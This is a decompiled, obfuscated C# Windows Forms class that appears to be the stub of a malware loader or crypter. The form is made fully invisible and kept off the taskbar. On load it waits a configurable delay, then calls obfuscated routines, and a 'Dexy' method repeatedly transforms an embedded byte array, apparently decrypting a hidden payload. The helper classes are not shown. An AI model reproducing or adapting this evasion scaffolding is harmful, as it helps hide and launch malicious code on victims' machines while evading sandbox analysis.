using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using a;
using hospitally.Properties;

namespace hospitally;

public class Form1 : Form
{
	private Button s;

	private Button W;

	private Button V;

	private CheckedListBox r;

	private CheckedListBox L;

	private ComboBox P;

	private DomainUpDown U;

	private DomainUpDown T;

	private Label K;

	private ListBox H;

	private ListBox e;

	private ListView g;

	private ListView m;

	private ListView N;

	private MaskedTextBox Z;

	internal IContainer o;

	internal CheckBox N;

	internal CheckBox A;

	internal CheckedListBox i;

	internal ComboBox c;

	internal Label G;

	internal Label W;

	internal Label M;

	internal ListView T;

	internal MenuStrip V;

	internal MaskedTextBox d;

	public Form1()
	{
		J();
	}

	public static byte[] Dexy()
	{
		a.r.k = 4;
		while (a.r.k >= 0)
		{
			a.r.Y = 0;
			while (a.r.Y < B.X.Length)
			{
				j.J();
				a.r.Y++;
			}
			a.r.k--;
		}
		return B.X;
	}

	private void I(object sender, EventArgs e)
	{
		using (EventWaitHandle eventWaitHandle = new ManualResetEvent(initialState: false))
		{
			eventWaitHandle.WaitOne(TimeSpan.FromSeconds(Settings.Default.Setting6));
		}
		f.P();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && o != null)
		{
			o.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void J()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Expected O, but got Unknown
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0133: Expected O, but got Unknown
		s = new Button();
		this.W = new Button();
		this.V = new Button();
		CheckBox val = (N = new CheckBox());
		CheckBox val2 = (A = new CheckBox());
		r = new CheckedListBox();
		CheckedListBox val3 = (i = new CheckedListBox());
		L = new CheckedListBox();
		P = new ComboBox();
		ComboBox val4 = (c = new ComboBox());
		U = new DomainUpDown();
		this.T = new DomainUpDown();
		Label val5 = (G = new Label());
		Label val6 = (W = new Label());
		K = new Label();
		Label val7 = (M = new Label());
		H = new ListBox();
		e = new ListBox();
		g = new ListView();
		m = new ListView();
		ListView val8 = (T = new ListView());
		this.N = new ListView();
		MenuStrip val9 = (V = new MenuStrip());
		MaskedTextBox val10 = (d = new MaskedTextBox());
		Z = new MaskedTextBox();
		((Control)this).SuspendLayout();
		((Control)s).set_Location(new Point(0, 0));
		((Control)s).set_Name("s");
		((Control)s).set_Size(new Size(75, 23));
		((Control)s).set_TabIndex(0);
		((Control)s).set_Text("button1");
		((ButtonBase)s).set_UseVisualStyleBackColor(true);
		((Control)this.W).set_Location(new Point(8, 8));
		((Control)this.W).set_Name("W");
		((Control)this.W).set_Size(new Size(75, 23));
		((Control)this.W).set_TabIndex(1);
		((Control)this.W).set_Text("button2");
		((ButtonBase)this.W).set_UseVisualStyleBackColor(true);
		((Control)this.V).set_Location(new Point(16, 16));
		((Control)this.V).set_Name("V");
		((Control)this.V).set_Size(new Size(75, 23));
		((Control)this.V).set_TabIndex(2);
		((Control)this.V).set_Text("button3");
		((ButtonBase)this.V).set_UseVisualStyleBackColor(true);
		((Control)N).set_AutoSize(true);
		((Control)N).set_Location(new Point(24, 24));
		((Control)N).set_Name("y");
		((Control)N).set_Size(new Size(80, 17));
		((Control)N).set_TabIndex(3);
		((Control)N).set_Text("checkBox1");
		((ButtonBase)N).set_UseVisualStyleBackColor(true);
		((Control)A).set_AutoSize(true);
		((Control)A).set_Location(new Point(32, 32));
		((Control)A).set_Name("X");
		((Control)A).set_Size(new Size(80, 17));
		((Control)A).set_TabIndex(4);
		((Control)A).set_Text("checkBox2");
		((ButtonBase)A).set_UseVisualStyleBackColor(true);
		((ListControl)r).set_FormattingEnabled(true);
		((Control)r).set_Location(new Point(40, 40));
		((Control)r).set_Name("r");
		((Control)r).set_Size(new Size(120, 94));
		((Control)r).set_TabIndex(5);
		((ListControl)i).set_FormattingEnabled(true);
		((Control)i).set_Location(new Point(48, 48));
		((Control)i).set_Name("f");
		((Control)i).set_Size(new Size(120, 94));
		((Control)i).set_TabIndex(6);
		((ListControl)L).set_FormattingEnabled(true);
		((Control)L).set_Location(new Point(56, 56));
		((Control)L).set_Name("L");
		((Control)L).set_Size(new Size(120, 94));
		((Control)L).set_TabIndex(7);
		((ListControl)P).set_FormattingEnabled(true);
		((Control)P).set_Location(new Point(64, 64));
		((Control)P).set_Name("P");
		((Control)P).set_Size(new Size(121, 21));
		((Control)P).set_TabIndex(8);
		((ListControl)c).set_FormattingEnabled(true);
		((Control)c).set_Location(new Point(72, 72));
		((Control)c).set_Name("j");
		((Control)c).set_Size(new Size(121, 21));
		((Control)c).set_TabIndex(9);
		((Control)U).set_Location(new Point(0, 0));
		((Control)U).set_Name("U");
		((Control)U).set_Size(new Size(120, 20));
		((Control)U).set_TabIndex(10);
		((Control)U).set_Text("domainUpDown1");
		((Control)this.T).set_Location(new Point(8, 8));
		((Control)this.T).set_Name("T");
		((Control)this.T).set_Size(new Size(120, 20));
		((Control)this.T).set_TabIndex(11);
		((Control)this.T).set_Text("domainUpDown2");
		((Control)G).set_AutoSize(true);
		((Control)G).set_Location(new Point(16, 16));
		((Control)G).set_Name("i");
		((Control)G).set_Size(new Size(35, 13));
		((Control)G).set_TabIndex(12);
		((Control)G).set_Text("label1");
		((Control)W).set_AutoSize(true);
		((Control)W).set_Location(new Point(24, 24));
		((Control)W).set_Name("Q");
		((Control)W).set_Size(new Size(35, 13));
		((Control)W).set_TabIndex(13);
		((Control)W).set_Text("label2");
		((Control)K).set_AutoSize(true);
		((Control)K).set_Location(new Point(32, 32));
		((Control)K).set_Name("K");
		((Control)K).set_Size(new Size(35, 13));
		((Control)K).set_TabIndex(14);
		((Control)K).set_Text("label3");
		((Control)M).set_AutoSize(true);
		((Control)M).set_Location(new Point(40, 40));
		((Control)M).set_Name("C");
		((Control)M).set_Size(new Size(35, 13));
		((Control)M).set_TabIndex(15);
		((Control)M).set_Text("label4");
		((ListControl)H).set_FormattingEnabled(true);
		((Control)H).set_Location(new Point(48, 48));
		((Control)H).set_Name("H");
		((Control)H).set_Size(new Size(120, 95));
		((Control)H).set_TabIndex(16);
		((ListControl)e).set_FormattingEnabled(true);
		((Control)e).set_Location(new Point(56, 56));
		((Control)e).set_Name("e");
		((Control)e).set_Size(new Size(120, 95));
		((Control)e).set_TabIndex(17);
		((Control)g).set_Location(new Point(64, 64));
		((Control)g).set_Name("g");
		((Control)g).set_Size(new Size(121, 97));
		((Control)g).set_TabIndex(18);
		g.set_UseCompatibleStateImageBehavior(false);
		((Control)m).set_Location(new Point(72, 72));
		((Control)m).set_Name("m");
		((Control)m).set_Size(new Size(121, 97));
		((Control)m).set_TabIndex(19);
		m.set_UseCompatibleStateImageBehavior(false);
		((Control)T).set_Location(new Point(80, 80));
		((Control)T).set_Name("a");
		((Control)T).set_Size(new Size(121, 97));
		((Control)T).set_TabIndex(20);
		T.set_UseCompatibleStateImageBehavior(false);
		((Control)this.N).set_Location(new Point(88, 88));
		((Control)this.N).set_Name("N");
		((Control)this.N).set_Size(new Size(121, 97));
		((Control)this.N).set_TabIndex(21);
		this.N.set_UseCompatibleStateImageBehavior(false);
		((Control)V).set_Location(new Point(0, 0));
		((Control)V).set_Name("O");
		((Control)V).set_Size(new Size(284, 24));
		((Control)V).set_TabIndex(22);
		((Control)V).set_Text("menuStrip1");
		((Control)d).set_Location(new Point(8, 8));
		((Control)d).set_Name("b");
		((Control)d).set_Size(new Size(100, 20));
		((Control)d).set_TabIndex(23);
		((Control)Z).set_Location(new Point(16, 16));
		((Control)Z).set_Name("Z");
		((Control)Z).set_Size(new Size(100, 20));
		((Control)Z).set_TabIndex(24);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).get_Controls().Add((Control)(object)Z);
		((Control)this).get_Controls().Add((Control)(object)d);
		((Control)this).get_Controls().Add((Control)(object)this.N);
		((Control)this).get_Controls().Add((Control)(object)T);
		((Control)this).get_Controls().Add((Control)(object)m);
		((Control)this).get_Controls().Add((Control)(object)g);
		((Control)this).get_Controls().Add((Control)(object)e);
		((Control)this).get_Controls().Add((Control)(object)H);
		((Control)this).get_Controls().Add((Control)(object)M);
		((Control)this).get_Controls().Add((Control)(object)K);
		((Control)this).get_Controls().Add((Control)(object)W);
		((Control)this).get_Controls().Add((Control)(object)G);
		((Control)this).get_Controls().Add((Control)(object)this.T);
		((Control)this).get_Controls().Add((Control)(object)U);
		((Control)this).get_Controls().Add((Control)(object)c);
		((Control)this).get_Controls().Add((Control)(object)P);
		((Control)this).get_Controls().Add((Control)(object)L);
		((Control)this).get_Controls().Add((Control)(object)i);
		((Control)this).get_Controls().Add((Control)(object)r);
		((Control)this).get_Controls().Add((Control)(object)A);
		((Control)this).get_Controls().Add((Control)(object)N);
		((Control)this).get_Controls().Add((Control)(object)this.V);
		((Control)this).get_Controls().Add((Control)(object)this.W);
		((Control)this).get_Controls().Add((Control)(object)s);
		((Control)this).get_Controls().Add((Control)(object)V);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MainMenuStrip(V);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)I);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
